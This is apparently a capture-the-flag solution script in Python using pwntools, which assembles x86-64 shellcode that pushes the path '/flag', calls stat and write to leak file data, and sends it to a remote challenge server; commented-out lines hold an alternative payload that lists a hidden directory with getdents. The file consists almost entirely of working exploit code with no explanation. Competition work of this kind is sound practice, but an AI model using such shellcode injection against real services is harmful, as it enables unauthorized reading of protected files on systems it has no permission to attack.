from pwn import *

context.arch = 'amd64'
binary = context.binary = ELF('./level2')
# gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM
# payload = shellcraft.open('/gHyy8peRmmIU0yVAeiPq96VmhE6W7JkM', oflag=constants.O_DIRECTORY)
# payload += shellcraft.getdents('rax', 'rsp', 1048)
# payload += shellcraft.write(1, 'rsp', 'rax')
# payload += shellcraft.exit(0)

payload = shellcraft.pushstr('/flag\x00')
payload += shellcraft.stat('rsp', 'rax')
payload += shellcraft.write(1, 'rax', 0x70)
payload += shellcraft.exit(0)

payload = asm(payload)
print(payload)

#p = binary.process()
p = remote('nc.ctf.unitedctf.ca', 6000)
p.sendline(payload)

pprint(p.recv())
p.interactive()
# P96gpflag